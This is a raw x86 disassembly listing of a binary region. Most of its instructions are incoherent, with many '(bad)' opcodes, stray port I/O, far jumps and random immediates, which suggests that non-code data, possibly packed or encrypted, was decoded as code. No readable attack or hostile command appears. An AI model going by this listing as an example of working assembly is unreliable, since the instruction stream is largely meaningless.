  41fc88:	scas   eax,DWORD PTR es:[edi]
  41fc89:	fisttp QWORD PTR [edx+0x6a]
  41fc8c:	fstp   st(1)
  41fc8e:	cmp    ebp,DWORD PTR [ebx]
  41fc90:	and    bl,cl
  41fc92:	mov    cl,0x90
  41fc94:	adc    BYTE PTR [ebx+0x69],ah
  41fc97:	into   
  41fc98:	xor    eax,0x3ae6a71e
  41fc9d:	pop    esp
  41fc9e:	test   BYTE PTR [eax+0x4ca61cea],bh
  41fca4:	out    0xcb,al
  41fca6:	pop    ds
  41fca7:	xor    BYTE PTR [edx],cl
  41fca9:	cmp    esp,DWORD PTR ds:0x69c4657a
  41fcaf:	push   esi
  41fcb0:	jno    0x41fcc0
  41fcb2:	ja     0x41fc8a
  41fcb4:	push   es
  41fcb5:	into   
  41fcb6:	inc    edx
  41fcb7:	fcom   DWORD PTR ds:0x689f2e7c
  41fcbd:	cmc    
  41fcbe:	ret    
  41fcbf:	lods   al,BYTE PTR ds:[esi]
  41fcc0:	loope  0x41fc75
  41fcc2:	jae    0x41fd37
  41fcc4:	jae    0x41fd32
  41fcc6:	add    al,0x48
  41fcc8:	shr    dh,1
  41fcca:	push   ecx
  41fccb:	sub    dh,BYTE PTR [esi-0x28]
  41fcce:	sbb    eax,0x66b72ecc
  41fcd3:	clc    
  41fcd4:	popf   
  41fcd5:	pop    es
  41fcd6:	jmp    0x2c5e:0xa011642f
  41fcdd:	inc    ebx
  41fcde:	ficomp DWORD PTR [esi+0x7f]
  41fce1:	int3   
  41fce2:	popa   
  41fce3:	in     al,0x43
  41fce5:	cmp    DWORD PTR [edi+0x27],edi
  41fce8:	and    edx,DWORD PTR [edx-0x63]
  41fceb:	mov    eax,0x4be7d15
  41fcf0:	pop    edx
  41fcf1:	sbb    eax,0x601a2e74
  41fcf6:	std    
  41fcf7:	xor    eax,0xd464a509
  41fcfc:	sti    
  41fcfd:	mov    al,0x43
  41fcff:	pop    ss
  41fd00:	je     0x41fd04
  41fd02:	ficomp WORD PTR [ebp+0x15]
  41fd05:	mov    cl,0xff
  41fd07:	dec    esi
  41fd08:	inc    ecx
  41fd09:	lds    ebp,FWORD PTR [ebx+0x54d199e4]
  41fd0f:	test   BYTE PTR [edi],0x57
  41fd12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd13:	out    0x46,eax
  41fd15:	out    0xbd,al
  41fd17:	cmp    bh,BYTE PTR [edi]
  41fd19:	or     al,0x94
  41fd1b:	push   cs
  41fd1c:	cmp    eax,ebx
  41fd1e:	jb     0x41fcef
  41fd20:	mov    ecx,eax
  41fd22:	sbb    BYTE PTR [ebp-0x2d9819bd],dl
  41fd28:	fdiv   st(6),st
  41fd2a:	xchg   ebp,ecx
  41fd2c:	popa   
  41fd2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd2e:	jl     0x41fd60
  41fd30:	dec    edi
  41fd31:	mov    ds:0x974d4387,eax
  41fd36:	xor    al,0x7d
  41fd38:	cmp    eax,0x692d6e23
  41fd3d:	cdq    
  41fd3e:	aas    
  41fd3f:	mov    ebp,0x34803c30
  41fd44:	jo     0x41fd32
  41fd46:	adc    ah,bh
  41fd48:	ins    DWORD PTR es:[edi],dx
  41fd49:	mov    eax,ds:0x2419dd9
  41fd4e:	jnp    0x41fdb2
  41fd50:	xor    esp,DWORD PTR [edx]
  41fd52:	pusha  
  41fd53:	neg    dh
  41fd55:	mov    esp,0x7abf7d48
  41fd5a:	dec    BYTE PTR [edi+eax*4]
  41fd5d:	or     edx,esi
  41fd5f:	pop    esi
  41fd60:	bound  ebp,QWORD PTR [edi]
  41fd62:	jge    0x41fd57
  41fd64:	adc    al,dl
  41fd66:	std    
  41fd67:	and    ebp,DWORD PTR [ebp+0x66]
  41fd6a:	test   BYTE PTR [edx+ebx*1-0x40],ch
  41fd6e:	and    DWORD PTR [ebx],ecx
  41fd70:	icebp  
  41fd71:	das    
  41fd72:	xchg   esi,ebp
  41fd74:	mov    esi,0x9e1d1041
  41fd79:	mov    ecx,0xc17b08e9
  41fd7e:	mov    edx,0xdd5be3f7
  41fd83:	scas   al,BYTE PTR es:[edi]
  41fd84:	aam    0x2d
  41fd86:	sbb    esi,0x9905ea9c
  41fd8c:	aad    0x73
  41fd8e:	into   
  41fd8f:	push   edi
  41fd90:	retf   0x1c70
  41fd93:	pop    es
  41fd94:	cwde   
  41fd95:	(bad)  
  41fd96:	rol    DWORD PTR ds:0x3c7d3fa7,1
  41fd9c:	xor    BYTE PTR [ebx-0x17],0xdc
  41fda0:	int    0x18
  41fda2:	xor    eax,0xb1c67307
  41fda7:	jecxz  0x41fd6b
  41fda9:	repnz (bad) 
  41fdab:	mov    ebp,0xd6284ee8
  41fdb0:	aad    0x82
  41fdb2:	dec    ecx
  41fdb3:	dec    ebx
  41fdb4:	test   al,0x2a
  41fdb6:	push   esi
  41fdb7:	lahf   
  41fdb8:	dec    edx
  41fdb9:	push   edi
  41fdba:	jmp    0xc085:0xf755afa2
  41fdc1:	push   ebp
  41fdc2:	adc    ah,BYTE PTR [edi]
  41fdc4:	lea    esi,[edx-0x2f]
  41fdc7:	pop    ecx
  41fdc8:	pop    edx
  41fdc9:	cdq    
  41fdca:	out    0xec,eax
  41fdcc:	jno    0x41fe2c
  41fdce:	jae    0x41fdac
  41fdd0:	xchg   BYTE PTR [eax*4-0x72523eea],al
  41fdd7:	out    dx,al
  41fdd8:	and    ecx,esp
  41fdda:	ja     0x41fdc0
  41fddc:	mov    esi,0x4ba38f6c
  41fde1:	stc    
  41fde2:	jmp    0x4976:0x35688622
  41fde9:	adc    edx,0x21
  41fdec:	icebp  
  41fded:	outs   dx,DWORD PTR ds:[esi]
  41fdee:	inc    esi
  41fdef:	arpl   WORD PTR [ebp+0xd766eae],di
  41fdf5:	adc    bl,BYTE PTR [eax-0x71]
  41fdf8:	sub    BYTE PTR [ecx],0xf9
  41fdfb:	shr    BYTE PTR [edi+0x18],0xc4
  41fdff:	pushw  ds
  41fe01:	mov    ss,WORD PTR [ebx+0x71dc57ff]
  41fe07:	cmp    ch,BYTE PTR [esi]
  41fe09:	addr16 or dh,ah
  41fe0c:	cmp    al,0x78
  41fe0e:	cld    
  41fe0f:	mov    DWORD PTR ds:0xf17756be,ebp
  41fe15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe16:	sti    
  41fe17:	jmp    0x41fdc6
  41fe19:	jecxz  0x41fe42
  41fe1b:	mov    bl,0x24
  41fe1d:	sti    
  41fe1e:	mov    ?,WORD PTR [edx+0x74]
  41fe21:	mov    edi,0xcfe08d65
  41fe26:	into   
  41fe27:	sar    ch,0x60
  41fe2a:	mov    al,ds:0x131d91e9
  41fe2f:	je     0x41fdcc
  41fe31:	loop   0x41fe62
  41fe33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe34:	mov    eax,0x12c4336f
  41fe39:	pop    esp
  41fe3a:	mov    cs,WORD PTR [edi+0x13]
  41fe3d:	inc    ebp
  41fe3e:	aas    
  41fe3f:	(bad)  
  41fe40:	jmp    0x41fe09
  41fe42:	outs   dx,DWORD PTR ds:[esi]
  41fe43:	stos   BYTE PTR es:[edi],al
  41fe44:	jnp    0x41fe10
  41fe46:	mov    edi,0x3dabd69c
  41fe4b:	jecxz  0x41fe73
  41fe4d:	xchg   BYTE PTR [ebp+ecx*4+0x5720e0ba],cl
  41fe54:	(bad)  
  41fe55:	sub    esp,DWORD PTR [eax]
  41fe57:	cmp    bl,dl
  41fe59:	mov    eax,0xde9252b1
  41fe5e:	push   edx
  41fe5f:	loopne 0x41feab
  41fe61:	aas    
  41fe62:	jne    0x41fe93
  41fe64:	xchg   esp,eax
  41fe65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe66:	dec    ecx
  41fe67:	andps  xmm0,xmm7
  41fe6a:	xor    al,0xd
  41fe6c:	mov    eax,0x20fb11cd
  41fe71:	dec    ebx
  41fe72:	sbb    eax,0xe6b665d3
  41fe77:	sar    DWORD PTR [ebx-0x1b85dc94],0x79
  41fe7e:	rcl    ecx,0x3
  41fe81:	retf   
  41fe82:	call   0x3654:0x61693d9d
  41fe89:	in     al,dx
  41fe8a:	into   
  41fe8b:	mov    ecx,0x5f488672
  41fe90:	jnp    0x41fe75
  41fe92:	pop    es
  41fe93:	cmp    eax,0x3e48474a
  41fe98:	mov    cl,0x5d
  41fe9a:	fidivr DWORD PTR [ecx+eiz*2+0x6b]
  41fe9e:	inc    edx
  41fe9f:	ror    esi,cl
  41fea1:	pop    esp
  41fea2:	dec    DWORD PTR [edi-0xfe2f48]
  41fea8:	jae    0x41ff0c
  41feaa:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41feac:	in     al,0xcc
  41feae:	call   DWORD PTR [eax-0x6fe00e46]
  41feb4:	jnp    0x41fed7
  41feb6:	jecxz  0x41fe38
  41feb8:	aad    0x94
  41feba:	jo     0x41fed2
  41febc:	lea    edx,[ebp-0x558a5dff]
  41fec2:	ss adc eax,0x21e7d58b
  41fec8:	imul   edx,DWORD PTR [esi-0x5b],0x8a7f7155
  41fecf:	enter  0x2ab5,0xb2
  41fed3:	or     esi,DWORD PTR [ebp-0x6d2de11d]
  41fed9:	mov    bl,0xac
  41fedb:	xor    dh,al
  41fedd:	pop    es
  41fede:	pop    esi
  41fedf:	das    
  41fee0:	pop    ecx
  41fee1:	gs sbb ch,bh
  41fee4:	xor    DWORD PTR gs:[edx+eax*1+0x2f710054],0xd55d48eb
  41fef0:	xor    eax,DWORD PTR [ebx+0x4c7f28c8]
  41fef6:	and    BYTE PTR [ebp+0x448502c9],dl
  41fefc:	xchg   DWORD PTR [ecx-0x3ed3094c],ecx
  41ff02:	xor    esi,esi
  41ff04:	fxch   st(5)
  41ff06:	jmp    0x12b3:0x746b24b6
  41ff0d:	push   eax
  41ff0e:	(bad)  
  41ff0f:	pop    edi
  41ff10:	stc    
  41ff11:	xor    al,0xfd
  41ff13:	inc    eax
  41ff14:	test   BYTE PTR [edx],0x66
  41ff17:	and    DWORD PTR [edi+0x1d],0x13
  41ff1b:	fisttp WORD PTR [eax]
  41ff1d:	stos   BYTE PTR es:[edi],al
  41ff1e:	test   DWORD PTR [ebx-0x3d725e8f],eax
  41ff24:	pop    ss
  41ff25:	or     BYTE PTR [edi],0x91
  41ff28:	rcr    BYTE PTR [ecx+ecx*8+0x38],cl
  41ff2c:	(bad)  [ebp-0x52]
  41ff2f:	push   eax
  41ff30:	pop    edx
  41ff31:	fsub   QWORD PTR [edi+0x9a03d58]
  41ff37:	out    0x1a,al
  41ff39:	push   eax
  41ff3a:	mov    edi,0xaf9541e1
  41ff3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff40:	inc    ebp
  41ff41:	aad    0x20
  41ff43:	fild   QWORD PTR ds:0x4d921944
  41ff49:	ss faddp st(0),st
  41ff4c:	iret   
  41ff4d:	leave  
  41ff4e:	inc    edx
  41ff4f:	mov    edi,0x4d5219dc
  41ff54:	or     eax,0x492a3059
  41ff59:	ss stos BYTE PTR es:[edi],al
  41ff5b:	leave  
  41ff5c:	fs (bad) 
  41ff5e:	mov    DWORD PTR [edi],ecx
  41ff60:	fs in  al,0x48
  41ff63:	pop    es
  41ff64:	push   edx
  41ff65:	jno    0x41ff93
  41ff67:	daa    
  41ff68:	mov    WORD PTR [eax+0x69],?
  41ff6b:	sub    eax,0x6c6e553c
  41ff70:	scas   eax,DWORD PTR es:[edi]
  41ff71:	imul   edx,edi
  41ff74:	mov    edi,DWORD PTR [ebp-0x8]
  41ff77:	mov    ebx,DWORD PTR [ebp-0x10]
  41ff7a:	sub    ebx,edi
  41ff7c:	cmp    ebx,edx
  41ff7e:	jmp    0x420490
  41ff83:	rcl    bh,1
  41ff85:	ror    ebp,1
  41ff87:	rcr    ecx,1
  41ff89:	aam    0xd5
  41ff8b:	pop    edx
  41ff8c:	inc    esi
  41ff8d:	daa    
  41ff8e:	clc    
  41ff8f:	dec    eax
  41ff90:	mov    al,BYTE PTR [ecx]
  41ff92:	and    eax,0x787f562a
  41ff97:	jae    0x420015
  41ff99:	js     0x420013
  41ff9b:	mov    ebx,DWORD PTR [ebp+0x56]
  41ff9e:	pushf  
  41ff9f:	rcr    DWORD PTR [ebx+0x7],0x6e
  41ffa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffa4:	and    al,BYTE PTR [esi-0x4e]
  41ffa7:	add    al,0x11
  41ffa9:	ret    0x6b79
  41ffac:	sbb    BYTE PTR [ebp+0x40],bl
  41ffaf:	jne    0x41ff9e
  41ffb1:	sar    BYTE PTR [bp+di],1
  41ffb4:	xchg   esi,eax
  41ffb5:	mov    cl,0x25
  41ffb7:	sahf   
  41ffb8:	(bad)  
  41ffb9:	test   ebx,esi
  41ffbb:	mov    ebp,ebx
  41ffbd:	nop
  41ffbe:	imul   esi,ecx,0x7a
  41ffc1:	fadd   QWORD PTR [eax]
  41ffc3:	aad    0x62
  41ffc5:	test   eax,0x2c7ca31f
  41ffca:	inc    esi
  41ffcb:	and    eax,0xae494fe1
  41ffd0:	mov    esi,DWORD PTR [esi+0x4031d264]
  41ffd6:	outs   dx,DWORD PTR ds:[esi]
  41ffd7:	pop    edi
  41ffd8:	movsx  edi,WORD PTR [eax]
  41ffdb:	pop    DWORD PTR [ecx+0x7bcf0241]
  41ffe1:	cdq    
  41ffe2:	ror    DWORD PTR [ecx+0x45bde845],0xc5
  41ffe9:	dec    ebx
  41ffea:	add    DWORD PTR [esi+0x3e],ebx
  41ffed:	arpl   WORD PTR [edx-0x10],bp
  41fff0:	jecxz  0x41ffe9
  41fff2:	loop   0x41ffe8
  41fff4:	and    ch,ch
  41fff6:	shr    BYTE PTR [ecx-0x38b8a611],0x7b
  41fffd:	scas   eax,DWORD PTR es:[edi]
  41fffe:	xor    esi,0xffffff9a
  420001:	ret    
  420002:	pop    ds
  420003:	push   0xffffff80
  420005:	fisub  DWORD PTR [eax]
  420007:	jne    0x420047
  420009:	inc    esi
  42000a:	inc    ecx
  42000b:	push   ss
  42000c:	ss test DWORD PTR cs:[eax],eax
  420010:	sbb    eax,0x242a7a52
  420015:	and    al,0x30
  420017:	jge    0x41ffc4
  420019:	xor    eax,0x5590f93c
  42001e:	stc    
  42001f:	les    ebp,FWORD PTR [edi-0x39100deb]
  420025:	outs   dx,BYTE PTR ds:[esi]
  420026:	pop    ecx
  420027:	push   cs
  420028:	mov    ah,0xb6
  42002a:	aam    0xc0
  42002c:	lahf   
  42002d:	push   ds
  42002e:	fisub  WORD PTR [ecx]
  420030:	sbb    esi,ebx
  420032:	pop    eax
  420033:	call   DWORD PTR [edx]
  420035:	sbb    DWORD PTR [edx-0xffe540b],ebx
  42003b:	sbb    ah,BYTE PTR [edx+0x2d]
  42003e:	adc    BYTE PTR [ecx-0x4b26c2e2],ch
  420044:	stc    
  420045:	fcom   DWORD PTR [edx-0x4e7cf08e]
  42004b:	popf   
  42004c:	mov    eax,ds:0xf7b9e886
  420051:	test   al,0xf1
  420053:	push   esp
  420054:	mov    al,ds:0x1d3c4d4c
  420059:	mov    bh,0x73
  42005b:	jno    0x4200b6
  42005d:	enter  0x65c5,0xcf
  420061:	push   es
  420062:	mov    bl,0x6
  420064:	out    dx,al
  420065:	mov    edx,0x483b1d23
  42006a:	add    al,0xe0
  42006c:	popa   
  42006d:	mov    bl,0x7
  42006f:	ja     0x420054
  420071:	aad    0x50
  420073:	mov    bl,BYTE PTR [esi]
  420075:	cld    
  420076:	sti    
  420077:	xchg   edi,eax
  420078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420079:	push   ds
  42007a:	in     eax,dx
  42007b:	inc    eax
  42007c:	mov    eax,ds:0x613146fd
  420081:	leave  
  420082:	sub    BYTE PTR [ebp+0x14],bh
  420085:	pop    edx
  420086:	lods   al,BYTE PTR ds:[esi]
  420088:	push   ds
  420089:	dec    esi
  42008a:	jae    0x4200ae
  42008c:	int3   
  42008d:	mov    ch,0x1d
  42008f:	loope  0x420104
  420091:	mov    edi,0x4d23e100
  420096:	xchg   cl,bl
  420098:	aam    0x8d
  42009a:	fwait
  42009b:	out    0xd7,al
  42009d:	out    dx,eax
  42009e:	mov    ch,BYTE PTR [ebx+ebx*8-0x49]
  4200a2:	leave  
  4200a3:	ins    BYTE PTR es:[edi],dx
  4200a4:	xchg   bh,bh
  4200a6:	mov    ah,0xfd
  4200a8:	(bad)  
  4200a9:	aam    0xdb
  4200ab:	and    DWORD PTR [esp+eax*4-0x7f],esi
  4200af:	mov    bl,0xaf
  4200b1:	dec    ebp
  4200b2:	and    DWORD PTR [edi-0x32],ebp
  4200b5:	xchg   DWORD PTR [esp+ebp*8-0x52],ecx
  4200b9:	popf   
  4200ba:	mov    ch,0xd3
  4200bc:	pop    ecx
  4200bd:	out    dx,al
  4200be:	sbb    edx,DWORD PTR ds:0x4232f929
  4200c4:	outs   dx,BYTE PTR ds:[esi]
  4200c5:	cmp    eax,0xa75759fc
  4200ca:	mov    dl,0x9c
  4200cc:	pop    edx
  4200cd:	xchg   esi,eax
  4200ce:	loop   0x420125
  4200d0:	adc    eax,0x30e715a3
  4200d5:	sbb    cl,BYTE PTR [edx+0xab1c8f3]
  4200db:	das    
  4200dc:	test   eax,0xa05a03b
  4200e1:	fdivr  DWORD PTR [edx+0x5a]
  4200e4:	mov    edx,0x6cdbed61
  4200e9:	int3   
  4200ea:	and    ah,0x6a
  4200ed:	sahf   
  4200ee:	daa    
  4200ef:	pop    DWORD PTR [edi-0x20bd1409]
  4200f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200f6:	ins    DWORD PTR es:[edi],dx
  4200f7:	sahf   
  4200f8:	sbb    DWORD PTR [edx],ebx
  4200fa:	inc    eax
  4200fb:	stc    
  4200fc:	adc    ebx,edi
  4200fe:	sbb    DWORD PTR [eax+edx*4],esp
  420101:	push   0xaaf568f8
  420106:	or     edi,0x8537259
  42010c:	push   ebx
  42010d:	inc    esi
  42010e:	scas   al,BYTE PTR es:[edi]
  42010f:	lock iret 
  420111:	sbb    eax,0xbc3d9fd7
  420116:	sbb    BYTE PTR [ebx+0x6797cf8c],dh
  42011c:	fs std 
  42011e:	pop    ecx
  42011f:	adc    BYTE PTR [ecx],bl
  420121:	jne    0x420118
  420123:	inc    eax
  420124:	adc    al,0x45
  420126:	mov    ds:0x29db15a0,eax
  42012b:	dec    eax
  42012c:	not    BYTE PTR [ebx]
  42012e:	enter  0x88ca,0xef
  420132:	test   DWORD PTR [edx],esp
  420134:	rol    DWORD PTR [eax+0x16],cl
  420137:	mov    bl,0x23
  420139:	jbe    0x420186
  42013b:	in     al,dx
  42013c:	mov    edi,0xad098edd
  420141:	int3   
  420142:	mov    cl,0xba
  420144:	or     DWORD PTR [edi+0x29],edx
  420147:	call   0xe14d8767
  42014c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42014d:	lods   al,BYTE PTR ds:[esi]
  42014e:	mov    eax,ds:0x339e0a6e
  420153:	out    0xd3,eax
  420155:	dec    esp
  420156:	and    eax,0x24eb50fd
  42015b:	xchg   esi,eax
  42015c:	xchg   ecx,eax
  42015d:	add    DWORD PTR [edi+0x47],edi
  420160:	and    al,0x57
  420162:	lods   al,BYTE PTR ds:[esi]
  420163:	(bad)  
  420164:	imul   esp,DWORD PTR gs:[ebx+0x19],0x337a058e
  42016c:	mov    edx,0x7a575ee1
  420171:	in     eax,dx
  420172:	add    al,0xb3
  420174:	xchg   ebx,eax
  420175:	clc    
  420176:	imul   ebp,DWORD PTR [ecx],0x115131be
  42017c:	clc    
  42017d:	(bad)  
  42017e:	ror    DWORD PTR [edx+0x19],1
  420181:	and    DWORD PTR cs:[eax],ebx
  420184:	mov    cl,0x56
  420186:	jmp    0x4201d8
  420188:	dec    ecx
  420189:	daa    
  42018a:	jo     0x1ad4aaf0
  420190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420191:	int3   
  420192:	(bad)  
  420194:	push   cs
  420195:	rol    BYTE PTR ds:0x2d5f8952,cl
  42019b:	enter  0xd12,0x2e
  42019f:	out    dx,al
  4201a0:	push   0x1ba1936f
  4201a5:	adc    BYTE PTR [esi+0x60],ch
  4201a8:	pop    ecx
  4201a9:	mov    eax,ds:0x51e533b6
  4201ae:	adc    al,0x4b
  4201b0:	div    DWORD PTR [eax]
  4201b2:	mov    bh,0xfb
  4201b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201b5:	push   ds
  4201b6:	mov    edi,DWORD PTR [ebp+0x0]
  4201b9:	outs   dx,DWORD PTR ds:[esi]
  4201ba:	gs ror bl,0xe5
  4201be:	xchg   DWORD PTR [ecx+edx*2-0x23],esp
  4201c2:	stc    
  4201c3:	pop    eax
  4201c4:	mov    dl,0xf2
  4201c6:	push   esp
  4201c8:	rcl    BYTE PTR [ebp-0x1830d2ee],0x5c
  4201cf:	dec    ebx
  4201d0:	mov    al,ds:0xd762f42c
  4201d5:	cli    
  4201d6:	ins    BYTE PTR es:[edi],dx
  4201d7:	(bad)  
  4201d8:	call   0x35e047f0
  4201dd:	mov    edi,0xf27bd95b
  4201e2:	inc    edi
  4201e3:	inc    ecx
  4201e4:	jmp    0x866b:0x1ecd5071
  4201eb:	jl     0x420269
  4201ed:	pusha  
  4201ee:	or     al,0x64
  4201f0:	pop    bp
  4201f2:	xchg   esi,eax
  4201f3:	fiadd  WORD PTR [esi-0x1cc97e9]
  4201f9:	cmp    al,0xec
  4201fb:	(bad)  
  4201fc:	adc    bl,BYTE PTR [ecx-0x6]
  4201ff:	and    ecx,DWORD PTR [ecx-0x76a871dc]
  420205:	das    
  420206:	push   ds
  420207:	not    DWORD PTR [esi]
  420209:	test   al,0x55
  42020b:	mov    es,WORD PTR [ebx-0x2aff70f3]
  420211:	and    DWORD PTR [ecx-0xc04e703],0x268baad8
  42021b:	mov    eax,ebx
  42021d:	push   edi
  42021e:	retf   0xb3c6
  420221:	xchg   BYTE PTR [edi+0x6b7c8276],ch
  420227:	out    dx,al
  420228:	cwde   
  420229:	retf   
  42022a:	mov    ebp,cs
  42022c:	xchg   ecx,eax
  42022d:	sub    BYTE PTR [ebx+ebx*2-0x43],ch
  420231:	ss je  0x42020a
  420234:	mov    gs,ebp
  420236:	enter  0x8ce2,0x8c
  42023a:	pop    ebp
  42023b:	shl    BYTE PTR [eax+edi*8+0xa],0x99
  420240:	mov    esi,DWORD PTR [edx+0x7b]
  420243:	ins    BYTE PTR es:[edi],dx
  420244:	retf   0x2f5f
  420247:	aas    
  420248:	jge    0x42028b
  42024a:	popa   
  42024b:	fld    DWORD PTR [ebx-0x6d773ba7]
  420251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420252:	popa   
  420253:	xor    edx,ecx
  420255:	pusha  
  420256:	test   ebp,0x11fc49dc
  42025c:	scas   al,BYTE PTR es:[edi]
  42025d:	cmp    DWORD PTR [edi+0x757e73f5],0x4c5153da
  420267:	add    eax,0x5dc41469
  42026c:	lahf   
  42026d:	gs inc ebp
  42026f:	push   esp
  420270:	adc    ch,dh
  420272:	clc    
  420273:	mov    eax,ds:0x1785f37
  420278:	mov    ecx,ss
  42027a:	push   es
  42027b:	aad    0x1f
  42027d:	out    dx,al
  42027e:	ins    DWORD PTR es:[edi],dx
  42027f:	outs   dx,BYTE PTR ds:[esi]
  420280:	loope  0x4202a5
  420282:	test   DWORD PTR [ecx+0x5d],edi
  420285:	jns    0x420221
  420287:	xchg   esp,eax
  420288:	das    
  420289:	sahf   
  42028a:	mov    al,ds:0x852955d1
  42028f:	leave  
  420290:	xchg   edx,eax
  420291:	cmp    DWORD PTR [ebx+0x67],ecx
  420294:	push   edx
  420295:	push   ss
  420296:	xchg   ebp,eax
  420297:	pop    esi
  420298:	into   
  420299:	imul   esp,DWORD PTR [eax],0xf5628c81
  42029f:	inc    eax
  4202a0:	xchg   edx,eax
  4202a1:	xchg   edi,eax
  4202a2:	lods   eax,DWORD PTR ds:[esi]
  4202a3:	xchg   esi,eax
  4202a4:	and    DWORD PTR [esi],edi
  4202a6:	adc    BYTE PTR [ebp-0x29434c1d],ch
  4202ac:	inc    edi
  4202ad:	dec    esi
  4202ae:	sbb    DWORD PTR [eax+ecx*4],edx
  4202b1:	dec    ebp
  4202b2:	pop    edi
  4202b3:	dec    ecx
  4202b4:	or     BYTE PTR [ecx+ebp*8],cl
  4202b7:	pop    esp
  4202b8:	call   0xcde2:0x19d4f7b8
  4202bf:	jnp    0x420274
  4202c1:	and    eax,0xa937fc05
  4202c6:	adc    eax,0x1bbd64c2
  4202cb:	(bad)  
  4202cc:	fcomp  QWORD PTR [eax-0x7a]
  4202cf:	arpl   WORD PTR [ecx+0x61088296],bx
  4202d5:	mov    al,ds:0x3bf3cb98
  4202da:	addr16 add eax,0x95ecaff1
  4202e0:	shl    DWORD PTR [ecx],1
  4202e2:	(bad)  
  4202e3:	push   cs
  4202e4:	adc    ah,dl
  4202e6:	jecxz  0x420353
  4202e8:	xor    eax,0xb51d1390
  4202ed:	inc    ecx
  4202ee:	jb     0x420368
  4202f0:	into   
  4202f1:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202f3:	icebp  
  4202f4:	xor    ebx,DWORD PTR [esi]
  4202f6:	mov    dl,0xa1
  4202f8:	cmp    BYTE PTR [esi+0x13f3ce3e],al
  4202fe:	xor    BYTE PTR [ebp+0x3c905293],0x4d
  420305:	sbb    eax,0x89881a38
  42030a:	test   DWORD PTR [edx-0x4827154a],ebp
  420310:	xlat   BYTE PTR ds:[ebx]
  420311:	cld    
  420312:	xchg   esi,eax
  420313:	test   eax,0xf8239f76
  420318:	jge    0x4202fe
  42031a:	ins    DWORD PTR es:[edi],dx
  42031b:	les    esi,FWORD PTR [ecx-0x2a93af28]
  420321:	ja     0x420341
  420323:	lds    ebp,FWORD PTR [edi+0x169dfa0]
  420329:	pop    esi
  42032a:	add    BYTE PTR [ebx],ah
  42032c:	push   edi
  42032d:	call   DWORD PTR [edx+0x6c60e81d]
  420333:	mov    eax,ds:0xca8fe7d1
  420338:	loopne 0x42033c
  42033a:	lds    edx,FWORD PTR [ecx+0x4f]
  42033d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42033e:	jae    0x42035b
  420340:	(bad)  
  420342:	cdq    
  420343:	fidivr WORD PTR [edi+esi*1]
  420346:	in     eax,dx
  420347:	jge    0x420319
  420349:	xchg   esi,eax
  42034a:	add    al,0xe4
  42034c:	xchg   ebp,eax
  42034d:	lods   eax,DWORD PTR ds:[esi]
  42034e:	dec    esi
  42034f:	test   dh,0x59
  420352:	push   ds
  420353:	push   eax
  420354:	(bad)  
  420356:	scas   eax,DWORD PTR es:[edi]
  420357:	jne    0x420307
  420359:	(bad)  
  42035a:	push   esi
  42035b:	or     bl,BYTE PTR [ebx]
  42035d:	push   esp
  42035e:	push   ss
  42035f:	mov    eax,DWORD PTR [esi]
  420361:	push   esi
  420362:	cwde   
  420363:	or     DWORD PTR [ebp+0x4d],ebp
  420366:	icebp  
  420367:	(bad)  
  420368:	test   al,0x29
  42036a:	stos   DWORD PTR es:[edi],eax
  42036b:	sbb    al,BYTE PTR [eax-0x1]
  42036e:	xchg   ebx,eax
  42036f:	bound  edx,QWORD PTR [edi+0x39806460]
  420375:	int3   
  420376:	inc    esp
  420377:	cld    
  420378:	mov    eax,0x98af8146
  42037d:	(bad)  
  42037e:	mov    WORD PTR [edi+eax*8],es
  420381:	(bad)  [edi+0x7972eade]
  420387:	xor    DWORD PTR [edx],edi
  420389:	(bad)  
  42038a:	mov    dh,0x68
  42038c:	pushf  
  42038d:	sahf   
  42038e:	aam    0xd2
  420390:	sbb    eax,DWORD PTR [edi+eiz*1-0x73]
  420394:	(bad)  [esi]
  420396:	test   DWORD PTR [ebx+0x63],edi
  420399:	mov    ecx,DWORD PTR [edx+0x38]
  42039c:	(bad)  
  42039d:	stos   DWORD PTR es:[edi],eax
  42039e:	push   edi
  42039f:	in     eax,0x3f
  4203a1:	retf   0x26a6
  4203a4:	xchg   esp,eax
  4203a5:	sbb    DWORD PTR [ecx+eax*2+0x70f568a],edi
  4203ac:	dec    ebp
  4203ad:	and    DWORD PTR [ecx+0x78],ebp
  4203b0:	sub    DWORD PTR [ecx+edi*4],esi
  4203b3:	jp     0x4203be
  4203b5:	adc    edi,DWORD PTR [ebx]
  4203b7:	inc    ebp
  4203b8:	ja     0x42039a
  4203ba:	and    BYTE PTR [edi],al
  4203bc:	imul   esp,DWORD PTR es:[ebx-0x59],0xce943fd1
  4203c4:	push   ds
  4203c5:	push   0x65
  4203c7:	sbb    al,0x7
  4203c9:	pop    esp
  4203ca:	xchg   ebp,eax
  4203cb:	jp     0x420442
  4203cd:	jecxz  0x4203e4
  4203cf:	jno    0x81e4e740
  4203d5:	xchg   ebp,eax
  4203d6:	outs   dx,BYTE PTR ds:[esi]
  4203d7:	jl     0x420400
  4203d9:	push   edi
  4203da:	mov    ebx,0x69855276
  4203df:	nop
  4203e0:	adc    al,0x9d
  4203e2:	out    0x0,eax
  4203e4:	dec    edx
  4203e5:	sbb    eax,0xf7117aca
  4203ea:	sbb    bl,dh
  4203ec:	xchg   ecx,eax
  4203ed:	retf   0x52e6
  4203f0:	mov    ebx,0x34399776
  4203f5:	jl     0x420429
  4203f7:	jne    0x42037e
  4203f9:	mov    bl,0x3f
  4203fb:	daa    
  4203fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203fd:	(bad)  
  4203fe:	enter  0xaca6,0x9
  420402:	inc    eax
  420403:	pop    eax
  420404:	gs mov ch,0xe1
  420407:	mov    esi,edx
